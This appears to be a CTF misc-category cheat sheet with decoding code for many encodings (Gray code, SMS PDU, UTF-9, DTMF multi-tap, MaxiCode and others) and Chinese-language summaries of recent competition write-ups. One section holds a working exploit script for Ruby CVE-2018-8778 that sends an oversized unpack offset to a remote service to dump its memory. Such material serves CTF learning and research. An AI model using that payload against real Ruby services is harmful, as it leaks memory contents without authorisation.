# CTF Misc - Advanced Encodings & Specialized Formats

## Table of Contents
- [Verilog/HDL](#veriloghdl)
- [Gray Code Cyclic Encoding (EHAX 2026)](#gray-code-cyclic-encoding-ehax-2026)
- [Binary Tree Key Encoding](#binary-tree-key-encoding)
- [RTF Custom Tag Data Extraction (VolgaCTF 2013)](#rtf-custom-tag-data-extraction-volgactf-2013)
- [SMS PDU Decoding and Reassembly (RuCTF 2013)](#sms-pdu-decoding-and-reassembly-ructf-2013)
- [Automated Multi-Encoding Sequential Solver (HackIM 2016)](#automated-multi-encoding-sequential-solver-hackim-2016)
- [RFC 4042 UTF-9 Decoding (SECCON 2015)](#rfc-4042-utf-9-decoding-seccon-2015)
- [Pixel Color Binary Encoding (Break In 2016)](#pixel-color-binary-encoding-break-in-2016)
- [Hexadecimal Sudoku + QR Assembly (BSidesSF 2026)](#hexadecimal-sudoku--qr-assembly-bsidessf-2026)
- [TOPKEK Binary Encoding (Hack The Vote 2016)](#topkek-binary-encoding-hack-the-vote-2016)
- [MaxiCode 2D Barcode Decoding (CSAW CTF 2016)](#maxicode-2d-barcode-decoding-csaw-ctf-2016)
- [DTMF Audio with Multi-Tap Phone Keypad Decoding (h4ckc0n 2017)](#dtmf-audio-with-multi-tap-phone-keypad-decoding-h4ckc0n-2017)
- [Music Note Interval Steganography (DefCamp 2017)](#music-note-interval-steganography-defcamp-2017)
- [Ruby Array#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)](#ruby-arrayunpack-buffer-under-read-cve-2018-8778-codegate-2019)
- [Binary Grid Text to QR Image + XOR Key (Pragyan CTF 2019)](#binary-grid-text-to-qr-image--xor-key-pragyan-ctf-2019)

---

## Verilog/HDL

```python
# Translate Verilog logic to Python
def verilog_module(input_byte):
    wire_a = (input_byte >> 4) & 0xF
    wire_b = input_byte & 0xF
    return wire_a ^ wire_b
```

---

## Gray Code Cyclic Encoding (EHAX 2026)

**Pattern (#808080):** Web interface with a circular wheel (5 concentric circles = 5 bits, 32 positions). Must fill in a valid Gray code sequence where consecutive values differ by exactly one bit.

**Gray code properties:**
- N-bit Gray code has 2^N unique values
- Adjacent values differ by exactly 1 bit (Hamming distance = 1)
- The sequence is **cyclic** — rotating the start position produces another valid sequence
- Standard conversion: `gray = n ^ (n >> 1)`

```python
# Generate N-bit Gray code sequence
def gray_code(n_bits):
    return [i ^ (i >> 1) for i in range(1 << n_bits)]

# 5-bit Gray code: 32 values
seq = gray_code(5)
# [0, 1, 3, 2, 6, 7, 5, 4, 12, 13, 15, 14, 10, 11, 9, 8, ...]

# Rotate sequence by k positions (cyclic property)
def rotate(seq, k):
    return seq[k:] + seq[:k]

# If decoded output is ROT-N shifted, rotate the Gray code start by N positions
rotated = rotate(seq, 4)  # Shift start by 4
```

**Key insight:** If the decoded output looks correct but shifted (e.g., ROT-4), the Gray code start position needs cyclic rotation by the same offset. The cyclic property guarantees all rotations remain valid Gray codes.

**Wheel mapping:** Each concentric circle = one bit position. Innermost = bit 0, outermost = bit N-1. Read bits at each angular position to build N-bit values.

---

## Binary Tree Key Encoding

**Encoding:** `'0' → j = j*2 + 1`, `'1' → j = j*2 + 2`

**Decoding:**
```python
def decode_path(index):
    path = ""
    while index != 0:
        if index & 1:  # Odd = left ('0')
            path += "0"
            index = (index - 1) // 2
        else:          # Even = right ('1')
            path += "1"
            index = (index - 2) // 2
    return path[::-1]
```

---

## RTF Custom Tag Data Extraction (VolgaCTF 2013)

**Pattern:** Data hidden inside custom RTF control sequences (e.g., `{\*\volgactf412 [DATA]}`). Extract numbered blocks, sort by index, concatenate, and base64-decode.

```python
import re, base64

rtf = open('document.rtf', 'r').read()
# Extract custom tags: {\*\volgactf<N> <DATA>}
blocks = re.findall(r'\{\\\*\\volgactf(\d+)\s+([^}]+)\}', rtf)
blocks.sort(key=lambda x: int(x[0]))  # Sort by numeric index
payload = ''.join(data for _, data in blocks)
flag = base64.b64decode(payload)
```

**Key insight:** RTF files support custom control sequences prefixed with `\*` (ignorable destinations). Malicious or challenge data hides in these ignored fields — standard RTF viewers skip them. Look for non-standard `\*\` tags with `grep -oP '\\\\\\*\\\\[a-z]+\d*' document.rtf`.

---

## SMS PDU Decoding and Reassembly (RuCTF 2013)

**Pattern:** Intercepted hex strings are GSM SMS-SUBMIT PDU (Protocol Data Unit) frames. Concatenated SMS messages require UDH (User Data Header) reassembly by sequence number.

```python
from smspdu import SMS_SUBMIT

# Read PDU hex strings (one per line)
pdus = [line.strip() for line in open('sms_intercept.txt')]

# Sort by concatenation sequence number (bytes 38-40 in hex)
pdus.sort(key=lambda pdu: int(pdu[38:40], 16))

# Extract and concatenate user data
payload = b''
for pdu in pdus:
    sms = SMS_SUBMIT.fromPDU(pdu[2:], '')  # Skip first byte (SMSC length)
    payload += sms.user_data.encode() if isinstance(sms.user_data, str) else sms.user_data

# Payload is often base64 — decode to get embedded file
import base64
with open('output.png', 'wb') as f:
    f.write(base64.b64decode(payload))
```

**Key insight:** SMS PDU format: `0041000B91` prefix identifies SMS-SUBMIT. UDH field at bytes 29-40 contains `05000301XXYY` where XX=total parts, YY=sequence number. Install `smspdu` library (`pip install smspdu`) for automated parsing. Output is often a base64-encoded image — use reverse image search to identify the subject.

---

## Automated Multi-Encoding Sequential Solver (HackIM 2016)

Some challenges require decoding 25+ sequential layers of different encodings. Build an automated decoder:

```python
import base64, zlib, bz2, codecs

def auto_decode(data):
    """Try each encoding and return first successful decode"""
    decoders = [
        ('base64', lambda d: base64.b64decode(d)),
        ('base32', lambda d: base64.b32decode(d)),
        ('base16', lambda d: base64.b16decode(d.upper())),
        ('zlib',   lambda d: zlib.decompress(d if isinstance(d, bytes) else d.encode())),
        ('bz2',    lambda d: bz2.decompress(d if isinstance(d, bytes) else d.encode())),
        ('rot13',  lambda d: codecs.decode(d, 'rot_13')),
        ('hex',    lambda d: bytes.fromhex(d if isinstance(d, str) else d.decode())),
        ('binary', lambda d: bytes(int(d[i:i+8], 2) for i in range(0, len(d.strip()), 8))),
        ('ebcdic', lambda d: d.decode('cp500') if isinstance(d, bytes) else d.encode().decode('cp500')),
    ]

    for name, decoder in decoders:
        try:
            result = decoder(data)
            if result and len(result) > 0:
                return name, result
        except:
            continue
    return None, data

# Chain decoder
data = initial_input
for i in range(50):  # Max layers
    name, data = auto_decode(data)
    if name is None:
        break
    print(f"Layer {i}: {name}")
```

Add Brainfuck detection (presence of `+-<>[].,` characters only) and other esoteric languages as needed.

---

## RFC 4042 UTF-9 Decoding (SECCON 2015)

RFC 4042 (April Fools' RFC) defines UTF-9, a 9-bit encoding for Unicode on systems with 9-bit bytes:

- Each 9-bit "byte" has a continuation bit (MSB): 1 = more bytes follow, 0 = last byte
- Lower 8 bits contain character data
- Multi-byte sequences concatenate the 8-bit portions

```python
def decode_utf9(data_bits):
    """Decode UTF-9 from a bitstring"""
    chars = []
    i = 0
    while i < len(data_bits):
        # Read 9-bit units until continuation bit is 0
        codepoint_bits = ''
        while i + 9 <= len(data_bits):
            continuation = int(data_bits[i])
            codepoint_bits += data_bits[i+1:i+9]
            i += 9
            if continuation == 0:
                break
        if codepoint_bits:
            chars.append(chr(int(codepoint_bits, 2)))
    return ''.join(chars)

# Convert octal/hex input to binary first
binary_string = bin(int(octal_data, 8))[2:]
result = decode_utf9(binary_string)
```

**Key insight:** Look for "4042" or "UTF-9" in challenge descriptions. The April Fools' RFC series (RFC 1149, 2549, 4042) occasionally appears in CTFs.

---

## Pixel Color Binary Encoding (Break In 2016)

Narrow images (7-8 pixels wide) may encode ASCII characters as binary pixel rows:

```python
from PIL import Image

img = Image.open('challenge.png')
pixels = img.load()
width, height = img.size

text = ''
for y in range(height):
    bits = ''
    for x in range(width):
        r, g, b = pixels[x, y][:3]
        # Red pixel = 1, Black pixel = 0 (or white=1, black=0)
        bits += '1' if r > 128 else '0'

    # Pad to 8 bits if needed (7-pixel-wide images)
    if len(bits) == 7:
        bits = '0' + bits  # Prepend leading zero

    text += chr(int(bits, 2))

print(text)
```

**Key insight:** Image width of 7 or 8 pixels strongly suggests binary character encoding (7-bit ASCII or 8-bit). Check both color channels and brightness thresholds.

---

### Hexadecimal Sudoku + QR Assembly (BSidesSF 2026)

**Pattern (hexhaustion):** Flag is encoded across 4 QR codes, each containing one quadrant of a 16x16 hexadecimal Sudoku grid. Solve the Sudoku, read the main diagonal values as hex pairs, convert to ASCII for the flag.

**Solving steps:**

1. **Scan QR codes:** Use `zbarimg` or `pyzbar` to decode all 4 QR codes
2. **Assemble grid:** Each QR contains a quadrant (8x8) with hex values (0-F) and blanks
3. **Solve the 16x16 Sudoku:** Standard Sudoku rules apply with hex digits (0-F) — each row, column, and 4x4 box contains each digit exactly once
4. **Extract flag:** Read diagonal values `grid[i][i]` for i=0..15, pair into bytes, decode as ASCII

```python
from itertools import product

def solve_hex_sudoku(grid):
    """Solve 16x16 Sudoku with hex digits 0-F using backtracking."""
    digits = set(range(16))

    def possible(r, c):
        used = set()
        used.update(grid[r])              # Row
        used.update(grid[i][c] for i in range(16))  # Column
        br, bc = (r // 4) * 4, (c // 4) * 4  # 4x4 box
        for i, j in product(range(br, br+4), range(bc, bc+4)):
            used.update({grid[i][j]})
        used.discard(-1)  # -1 = blank
        return digits - used

    def solve():
        for r, c in product(range(16), range(16)):
            if grid[r][c] == -1:
                for d in possible(r, c):
                    grid[r][c] = d
                    if solve():
                        return True
                    grid[r][c] = -1
                return False
        return True

    solve()
    return grid

# Read diagonal and convert to ASCII
solved = solve_hex_sudoku(grid)
diag_hex = ''.join(format(solved[i][i], 'X') for i in range(16))
flag = bytes.fromhex(diag_hex).decode('ascii')
print(flag)  # e.g., "HYPOAXIS"
```

**Key insight:** The QR codes serve as both a distribution mechanism (splitting the puzzle into 4 pieces) and a data encoding layer. The actual flag encoding is in the Sudoku solution's diagonal values interpreted as hex bytes.

**When to recognize:** Challenge distributes multiple QR codes, mentions "hex", "nibbles", or "16x16 grid". QR content contains hex characters with blanks/underscores.

**References:** BSidesSF 2026 "hexhaustion"

---

### TOPKEK Binary Encoding (Hack The Vote 2016)

Custom binary encoding where `KEK` represents bit 0 and `TOP` represents bit 1. Exclamation marks indicate bit repetition count.

```python
def decode_topkek(encoded):
    """Decode TOPKEK encoding: KEK=0, TOP=1, !=repeat count"""
    tokens = encoded.split()
    bits = ""

    for token in tokens:
        # Count exclamation marks (repeat count = len - 3)
        base = token.replace('!', '')
        repeats = len(token) - len(base)
        if repeats == 0:
            repeats = 1

        if base == "KEK":
            bits += "0" * repeats
        elif base == "TOP":
            bits += "1" * repeats

    # Convert bit string to ASCII
    message = ""
    for i in range(0, len(bits), 8):
        byte = bits[i:i+8]
        if len(byte) == 8:
            message += chr(int(byte, 2))

    return message

# Example: "KEK! TOP!! KEK TOP!"
# = "0" + "11" + "0" + "1" = "0110 1..."
```

**Key insight:** TOPKEK is a CTF-specific encoding. Recognize it by the pattern of `TOP`/`KEK` words with varying numbers of `!` suffixes. Each `!` adds one repetition of the corresponding bit value. Decode to binary, then group into 8-bit bytes for ASCII.

---

### MaxiCode 2D Barcode Decoding (CSAW CTF 2016)

MaxiCode is a hexagonal 2D barcode used by UPS, occasionally found in CTF forensics challenges.

```bash
# Identify MaxiCode: distinctive bullseye center pattern
# with hexagonal dot matrix (unlike QR's square modules)

# Decode using zxing library:
# Online: https://zxing.org/w/decode.jspx (upload image)

# Python:
# pip install zxing pyzbar
python3 -c "
from pyzbar.pyzbar import decode
from PIL import Image
results = decode(Image.open('maxicode.gif'), symbols=[pyzbar.ZBarSymbol.CODE128])
# Note: pyzbar may not support MaxiCode directly
# Use zxing Java library instead:
"

# Java zxing command-line:
java -cp javase.jar:core.jar com.google.zxing.client.j2se.CommandLineRunner maxicode.gif

# Alternative: use online decoders
# - https://products.aspose.app/barcode/recognize
# - https://www.onlinebarcodereader.com/
```

**Key insight:** MaxiCode has a distinctive bullseye center (3 concentric circles) surrounded by a hexagonal grid. Standard QR decoders won't read it. Use zxing (Java) which supports MaxiCode natively, or online barcode decoders. MaxiCode is found in shipping labels, CTF forensics disk images, and embedded in other files.

---

### DTMF Audio with Multi-Tap Phone Keypad Decoding (h4ckc0n 2017)

**Pattern:** Audio file contains DTMF telephone keypad tones. This is a two-layer encoding: first decode tones to a digit sequence, then decode grouped digits as multi-tap phone keypad input (repeated presses select letters).

**Step 1 — Decode DTMF tones to digits:** Use Audacity's spectrogram view or an online DTMF decoder to identify tone pairs. Pauses/gaps indicate word or group boundaries.

**Step 2 — Decode multi-tap keypad:** Group digits by their key press sequences, then map to letters:

```python
# Multi-tap decode mapping
T9 = {
    '2':'a',  '22':'b',  '222':'c',
    '3':'d',  '33':'e',  '333':'f',
    '4':'g',  '44':'h',  '444':'i',
    '5':'j',  '55':'k',  '555':'l',
    '6':'m',  '66':'n',  '666':'o',
    '7':'p',  '77':'q',  '777':'r', '7777':'s',
    '8':'t',  '88':'u',  '888':'v',
    '9':'w',  '99':'x',  '999':'y', '9999':'z',
}

def decode_multitap(groups):
    """groups: list of strings like ['444', '88', '2', ...]"""
    return ''.join(T9.get(g, '?') for g in groups)
```

**Key insight:** Two-layer encoding — DTMF tones encode digits, then digit sequences use multi-tap phone keypad mapping. Use Audacity's spectrogram to identify pause positions for grouping boundaries. Each same-digit run maps to one letter; a pause separates distinct keypresses on the same digit key.

---

### Music Note Interval Steganography (DefCamp 2017)

**Pattern:** An MP3 is transcribed to musical notes. The flag is encoded as pairs of notes where each note maps to a nibble (4 bits) based on its position (scale degree) in the D major scale. Two nibbles combine to form one byte/character.

**Encoding scheme:**
- D major scale degrees 0–7 map to nibble values 0–7 (3-bit nibble) or 0–15 (4-bit nibble) depending on variant
- Each pair of consecutive notes encodes one character: `(note1 << 4) | note2`
- Known flag prefix/suffix (e.g., `CTF{...}`) at start/end reveals the alphabet mapping

**Recovery approach:**

```python
# Example: D major scale degree → nibble value
# D=0, E=1, F#=2, G=3, A=4, B=5, C#=6, D(octave)=7
scale = {'D': 0, 'E': 1, 'F#': 2, 'G': 3, 'A': 4, 'B': 5, 'C#': 6}

notes = ['A', 'D', 'G', 'E', ...]  # transcribed from audio

chars = []
for i in range(0, len(notes) - 1, 2):
    hi = scale[notes[i]]
    lo = scale[notes[i+1]]
    chars.append(chr((hi << 4) | lo))

print(''.join(chars))
```

**Key insight:** Known plaintext at the start and end (flag format like `CTF{` and `}`) reveals the encoding alphabet — map the known characters back to their note pairs to confirm the scale-degree assignment. Musical scale degree = nibble value; pairs of notes = one byte.

---

## Ruby Array#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)

**Pattern:** A Ruby service calls `String#unpack` (or `Array#pack`) with an attacker-controlled format string. On pre-2.5.1 Ruby, oversized `@N` offsets are compared with signed integers, so a huge N wraps to a negative pointer offset — `unpack` then reads bytes from memory *before* the string's buffer and emits them as integers. Combined with the common bug of putting user input inside the format (e.g. `input.unpack("C*#{input}.length")`), you get an arbitrary memory dump primitive.

```python
# Remote Ruby server evaluates: input.unpack("C*#{input}.length")
# Supplying "@HUGECHUNK1200000" as input builds format "C*@HUGECHUNK1200000.length"
# which unpack parses as: @<offset> C<count> -> read <count> bytes from far offset.
import socket
payload = b'@18446744073708351616C1200000\n1\n'   # 2**64 - 0x1C0000
s = socket.create_connection(('target', 12137))
s.sendall(payload)
data = b''
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk

# Each emitted line is one int (byte value from leaked memory)
import string
out = ''.join(
    chr(int(line)) for line in data.decode(errors='ignore').splitlines()
    if line.strip().isdigit() and chr(int(line)) in string.printable
)
import re
print(re.findall(r'FLAG\{[^}]*\}', out))
```

**Key insight:** `String#unpack` is not inherently unsafe — it becomes catastrophic when (a) the format string is attacker-controlled (format-injection pattern, equivalent to `printf` bugs), and (b) the Ruby runtime is pre-2.5.1 (CVE-2018-8778). Huge `@N` offsets leak arbitrary memory. Always audit Ruby services that interpolate user input into `pack`/`unpack`/`sprintf` templates.

**References:** Codegate CTF 2019 Preliminary — mini converter, writeup 13209

---

## Binary Grid Text to QR Image + XOR Key (Pragyan CTF 2019)

**Pattern:** A text file contains only `0` and `1` characters (often one per line or with random line breaks). Strip whitespace, verify the length is a perfect square (or a known W*H), render as a pixel grid, and decode with `pyzbar`. The QR payload is hex-encoded and must be XORed with a repeating key (commonly `flag` or the challenge name) to reveal the flag.

```python
from PIL import Image, ImageDraw
from pyzbar.pyzbar import decode

raw = open('01qr').read()
bits = ''.join(c for c in raw if c in '01')
# Guess dimensions
import math
n = int(math.isqrt(len(bits)))
assert n * n == len(bits), f'not square: {len(bits)}'

scale = 5
img = Image.new('RGB', (n * scale, n * scale), (255, 255, 255))
d = ImageDraw.Draw(img)
for i in range(n):
    for j in range(n):
        if bits[i * n + j] == '0':           # 0 == black in this challenge
            d.rectangle((j*scale, i*scale,
                         j*scale + scale, i*scale + scale), fill=(0, 0, 0))
img.save('qr.png')

hexstr = decode(img)[0].data.decode()
ct = bytes.fromhex(hexstr)
key = b'flag'
pt = bytes(b ^ key[i % len(key)] for i, b in enumerate(ct))
print(pt)
```

**Key insight:** Binary-grid text files are often "render me" puzzles — one pixel per bit, scale by 4-8x so `zbarimg`/`pyzbar` can find the finder patterns. If the decoded bytes are printable-ish but nonsense (e.g. `9YQ8S_VY^`), try short repeating-key XOR with the word `flag`, the CTF name, or `ctf{` — XORing the first 5 bytes of ciphertext with `pctf{` recovers the key immediately.

**References:** Pragyan CTF 2019 — EXORcism, writeup 13835

---

## [来自实战] 先声夺人（ISCC 2026）

**技术模式**: 零宽字符四进制隐写 + zlib压缩载荷 + PoW（SHA-256前N位为0取最小s）+ PBKDF2派生key + AES-256-CBC解密

**关键操作**:
1. 统计U+200B/200C/200D/FEFF四种零宽字符共2592个，映射为4进制（0/1/2/3），每4位合1字节
2. 枚举24种字符顺序、BE/LE、是否bit-reverse、zlib起始偏移，命中组合：顺序U+200B/C/D/FEFF，大端，从偏移4开始zlib解压
3. 解出JSON：difficulty_bits=26，nonce=inst_000_42ba6c3fb9863dfa，目标AES-256-CBC
4. PoW：多进程暴力枚举s从0开始，SHA-256(nonce||str(s))前26位全为0的最小s（本机结果s=39235849）
5. PBKDF2-HMAC-SHA256(password=str(s).encode(), salt=nonce.encode(), iterations=10000, dklen=32)，AES-256-CBC+PKCS7解密

**适用场景**: 下次遇到文本文件"像正常文章但字符断裂感异常"时，立刻统计零宽字符种类数量；遇到challenge.txt+JSON载荷+difficulty_bits组合时，判断是否为PoW+KDF+对称解密三段式

---

## [来自实战] 卜肆残局（ISCC 2026）

**技术模式**: 多类古典符号系统各自编码不同数据段（易经爻画/奇门遁甲门序/洛书盘BMP尾插/节气筛选）→各出8字符Base64→拼接MD5→解AES压缩包→最终flag

**关键操作**:
1. 天象（铜钱卦SVG）：外圈+内圈16枚铜钱各3爻→6bit，按先天序（乾兑离震巽坎艮坤）读取→8个Base64字符→解码第一段
2. 人言（签筒残册TXT）：每门旁批Base64解"去第X第Y句"→删两句后6句句尾标点（。→0，﹒→1）→6bit→按休生伤杜景死惊开门序得8字符→解码第二段
3. 地理（洛书盘BMP）：PNG/BMP尾插ZIP→ZIP套ZIP→tar.gz→后天九宫映射字符（丢中五，只取1234689）→解码第三段
4. 时令（漏刻历盘CSV）：按候气规则筛8个节气行（序1,4,7,10,13,16,19,22）→六断列宜=1忌=0→6bit→8字符→解码第四段
5. 四段拼接→MD5=压缩包密码→解ZIP→AES解密→flag

**适用场景**: 下次遇到多类传统符号编码（卦爻/节气/古代数术）时，注意每类有独立的读取顺序规则，且通常不能按字面顺序或文件出现顺序处理

---

## [来自实战] 数字奥秘（ISCC 2026）

**技术模式**: PNG tEXt块藏参数（VM代码+CRT余数系统）+ PNG尾部挂VM源码 + 自定义VM的int()截断bug修正 + 广义CRT + XOR解密

**关键操作**:
1. 文件头89 50 4E 47=PNG（扩展名伪装为.bin）；遍历PNG chunk，tEXt块藏SYNC_CODE（Brainfuck变体）/PERIODS/SYNC_HINT/SYNC_PAYLOAD
2. IEND之后有3006字节Python VM源码；VM的`#`指令用int()截断而非round()，导致8个输出值各丢失0.6~0.8尾数
3. 修正VM：把int()改为round()，得到正确residues [363,707,138,171,804,594,1587,1530]
4. PERIODS中的模数两两不互素（gcd(868,1760)=4等），必须用广义CRT逐个合并，不能套互素版模板，得merged_result=7359267
5. 以str(merged_result)为XOR key解密SYNC_PAYLOAD（base64解码后循环XOR）

**适用场景**: 下次遇到PNG+tEXt块+附加VM代码时，仔细审VM源码中的数值截断操作（int/floor/trunc），并对CRT约束的模数做互素性检查

---

## [来自实战] 签到电台（长城杯2022）

**技术模式**: 标准电码表查表 + 模10算法（逐位加/减不进位不借位）= 变换后电码，通过HTTP API发电报获得flag。

**关键操作**:
1. 从公众号获取两个hint：七字汉字对应的电码（查标准电码表），以及"密码本"前28位数字
2. 模10算法：两数字逐位运算，加不进位、减不借位（如1+9=0，3-7=6）
3. 先发`/send?msg=s`启动电报，再发变换后电码字符串
4. 访问`/secret`拿密码本，取前28个数字与hint电码做模10运算，得到要发送的最终电码

**适用场景**: 遇到"发电报"类题目 + 提示"模十运算"时，逐位单独做加/减，不要当成普通十进制加减法

---

## [来自实战] ISO9798双向认证（长城杯2022）

**技术模式**: 服务端PoW（SHA-256前缀碰撞爆破）+ ISO9798-2双向挑战码认证协议，理解ra/rb/K字段顺序即可通关。

**关键操作**:
1. PoW：爆破4字节前缀使sha256(prefix+salt)==target_hash，字符集alphanumeric遍历即可
2. 发送32个'0'过第二步，服务端返回长串：按协议分割ra/rb/K各16字节
3. 最终响应格式：rb+ra拼接后发回，即`rb || ra`（注意顺序），服务端验证后给flag
4. 协议要点：ISO9798-2是"服务端先发ra，客户端回rb+ra以证明知道K，服务端再发rb"

**适用场景**: 遇到带PoW的认证协议题，先确认协议版本（ISO9798-2 vs 3），注意响应字段的拼接顺序（rb||ra vs ra||rb）

---

## [来自实战] 通风机 — STEP7-MicroWIN mwp文件 + 文件头修补（长城杯决赛2024）

**技术模式**: mwp后缀是西门子STEP7-MicroWIN SMART PLC项目文件，需专用软件打开；文件头损坏时对比正常文件修补，符号表中藏flag的base64编码。

**关键操作**:
1. 搜索mwp文件格式对应软件：STEP 7-MicroWIN SMART（工业控制PLC编程环境）
2. 尝试导入失败时，010Editor对比正常mwp文件头，定位损坏字节并修补
3. 导入成功后，查看"符号表"(Symbol Table)栏，其中变量名/注释可能藏有base64编码串
4. base64解码得到flag

**适用场景**: 遇到工控/ICS类文件（mwp/s7p/tia等）时，搜索对应厂商软件（西门子/罗克韦尔/施耐德）；文件头损坏时必用010Editor与正常样本对比修补；符号表/注释/变量名是常见隐写点

---

## [来自实战] 神秘文件 — PPT多层隐写综合（长城杯决赛2024）

**技术模式**: PPTX解压后在slide/comment/embedding/vba/xml各层藏flag分段，用凯撒/Bifid/RC4/ROT13/base64循环等多种密码组合。

**关键操作**:
1. ppt正文幻灯片：缩小/旋转/透明度0找隐藏文本
2. 备注(ppt/notesSlides/)：base64循环解密
3. 批注(ppt/comments/)：直接读part编号
4. 嵌入文档(ppt/embeddings/)：解压出word/xlsx，凯撒解密内容
5. VBA宏(ppt/vbaProject.bin)：strings提取，RC4解密（密钥在core.xml）
6. XML隐写(slideLayouts/slides/)：标签属性/字体颜色编码，ROT13→base64解
7. 核心属性(docProps/core.xml)：Bifid密文+密钥

**适用场景**: PPTX类隐写题必先解压，逐层扫描slide/comment/embedding/vba/docProps/slideLayouts；多段flag需按part编号拼接；密钥常在core.xml或另一层级，交叉引用解密

---

## [来自实战] mp3隐写 — foremost+zsteg+mp3stego+ROT47综合（西湖论剑2023）

**技术模式**: MP3文件多层隐写：foremost分离内嵌图片→zsteg提取图片通道中的ZIP→mp3stego提取MP3压缩隐写数据为ZIP密码→ROT47解码密码→解压ZIP得密文→控制台执行得flag。

**关键操作**:
1. foremost分离：`foremost mp3_file.mp3 -o output/`，在output/jpg或png目录找到分离的图片
2. zsteg扫描图片：`zsteg image.png -a`列出所有通道，发现某通道(如b1,rgb,lsb)含ZIP文件头`PK\x03\x04`
3. 提取ZIP：`zsteg image.png -E 'b1,rgb,lsb' > hidden.zip`，解压需密码
4. mp3stego解密：`decode -X mp3_file.mp3 -P ""` 或使用GUI版mp3stego工具，输出隐藏数据为一串字符（即ZIP密码）
5. ROT47解码密码：工具搜索ROT47或Cyberchef，将mp3stego输出解码→得明文密码
6. 解压ZIP：得到密文字符串（如`K92=2?23@D32:@FD6`），识别为某脚本语言（题目提示"cipher"+分号结尾）
7. 控制台执行：在Node.js/Python/浏览器控制台执行密文字符串，输出flag

**适用场景**: MP3隐写优先mp3stego工具（MP3压缩时嵌入数据）；foremost万能分离图片/压缩包；zsteg专门提取PNG/BMP通道隐写；ROT47/ROT13常见于CTF密码学；密文像代码且有分号→直接控制台执行

---

## [来自实战] Misc1 — Manchester差分编码解码 (网鼎杯2024朱雀组)

**技术模式**: 二进制文件内容是差分Manchester编码（相邻两位相同→0，不同→1），解码后得到ZIP，ZIP中数据有周期性冗余字节需要清除。

**关键操作**:
1. 差分Manchester解码：相邻2位相同 → bit=0，不同 → bit=1
   ```python
   out = ['0' if s[i*2:i*2+2]==s[i*2+2:i*2+4] else '1' for i in range(len(s)//2-1)]
   hex_output = hex(int(''.join(out), 2))[2:]
   ```
2. 去掉文件头`100000015`→转ZIP
3. ZIP数据有交错冗余字节：每`j`字节取前`j-6`字节（j从12爆破到44）
   ```python
   for j in range(12, 45):
       out = bytearray()
       for i in range(0, n, j): out.extend(all_b[i:i+(j-6)])
       with open(f'out{j}.zip','wb') as f: f.write(out)
   ```
4. 验证：正确的j=22时能恢复有效ZIP文件

**适用场景**: 电信/信号类题遇到01序列先猜曼彻斯特/差分曼彻斯特编码；ZIP恢复后若仍损坏尝试周期性去除额外字节（binwalk或010Editor分析字节分布）

---

## [来自实战] MISC04 — Peano-Hilbert曲线像素重排 → QR码 (网鼎杯2024青龙组)

**技术模式**: PNG图片像素按Peano-Hilbert空间填充曲线顺序排列（线性扫描→乱序），逆向重排后得到QR码。

**关键操作**:
1. 生成Peano曲线坐标列表（递归生成order 6）
2. 按curve顺序遍历，将原图像素放到新图线性位置：
   ```python
   for i, (x, y) in enumerate(order):
       new_x, new_y = i % width, i // width
       pixel = img.getpixel((x, height-1-y))
       new_image.putpixel((new_x, new_y), pixel)
   ```
3. 输出图片RGB通道可能需要分离才能识别QR码
4. Hilbert曲线类似，参考IrisCTF 2024 writeup脚本

**适用场景**: 图片"像素打乱"类题优先考虑空间填充曲线（Hilbert/Peano/Z阶）；若宽高是2的幂次方高度怀疑；分离RGB通道后扫码

---

## [来自实战] Misc02 — Linux内存镜像取证 (Ubuntu22.04 + strings + base64) (网鼎杯2024青龙组)

**技术模式**: vol3无法识别内存镜像时，直接用strings+grep定位关键文件，在010Editor中搜索文件头后缀提取base64编码的PNG；内存末尾隐藏7z压缩包。

**关键操作**:
1. `strings flag | grep Desktop` → 确认用户名和桌面路径
2. `strings flag | grep /home/user/Desktop/` → 发现`base64 xxx.png > xxx.txt`命令痕迹
3. 在010Editor中搜索PNG base64文件头`iVBORw0KGgo`（PNG头的base64形式）定位图片
4. 图片在内存中分段存储：提取第一段→搜索尾部字节→拼接后续段
5. `zsteg image.png` → 发现Hint字符串（如`Y3p_Ke9_1s_?????`）
6. 搜索7z文件头`37 7A BC AF 27 1C`在内存末尾 → 手动提取7z文件
7. ARCHPR掩码爆破7z（按hint格式）→ 解压得pyc字节码 → 分析得SM4密钥 → CyberChef解密
8. vol3 symbols制作：用dwarf2json从ddeb包生成json→放`volatility3/framework/symbols/linux/`

**适用场景**: vol3失效时strings+010直接提取；base64 PNG头固定为`iVBORw0KGgo`；内存末尾优先搜7z/zip/pdf文件头；pyc字节码可通过PUSH_NULL/LOAD_NAME/CALL等opcode推断加密算法

---

## [来自实战] Misc3 — VeraCrypt + CRC32碰撞 (网鼎杯2024朱雀组)

**技术模式**: PNG binwalk提取多个小ZIP文件，每个ZIP只有6字节内容但有CRC32，用CRC32碰撞恢复明文拼出VeraCrypt密码，挂载后得到RSA私钥。

**关键操作**:
1. binwalk分离PNG → 多个只有6字节内容的加密ZIP
2. 对每个ZIP进行CRC32碰撞（暴力搜索6字节内容使CRC32匹配）
3. 将碰撞得到的片段按合理语义拼接 → 例如得到密码`This_WD_010cryptPw`
4. VeraCrypt挂载加密卷（密码同上）→ 获取RSA私钥PEM文件
5. 将RSA加密的flag.txt用私钥解密得flag
6. 注意：VeraCrypt文件特征是无文件头/后缀，但描述提示"加密软件"

**适用场景**: 多小ZIP且内容极短（≤8字节）优先CRC32碰撞；VeraCrypt无明显文件头，凭题目提示和文件大小判断；RSA加密flag通常需要先还原私钥

---

## [来自实战] game_go_1 — EXE内嵌MSCF Cabinet提取 + RPG Maker strings (DASCTF)

**技术模式**: EXE后挂了CAB资源包（MSCF文件头），提取后得到RPG Maker VX Ace项目，从rvdata2资源文件中strings提取UUID格式flag（注意拼接方式）。

**关键操作**:
1. 在exe中搜索`MSCF`（4D 53 43 46）→ 确认Cabinet格式资源包
2. 用7-zip/extract32提取CAB包内容 → RPG Maker VX Ace项目结构（.rvdata2文件）
3. 用strings提取flags：
   ```bash
   strings -a Weapons.rvdata2 | grep -E "DASCTF|flag|[0-9a-f-]{8,}"
   ```
4. 提取到分段UUID，注意：原始两段边界处有`-`需手动拼接（非标准UUID格式）
5. 格式：`DASCTF{1168cb17-31ff-43b7-<middle>-b586-8414d383afce}` → 中间段需要填写

**适用场景**: 怀疑EXE挂载资源时搜MSCF/PK/7z等文件头；RPG Maker项目(.rvdata2)是Marshal序列化格式，strings直接可读取字符串；UUID类flag注意原始数据中可能分段或有分隔符

---

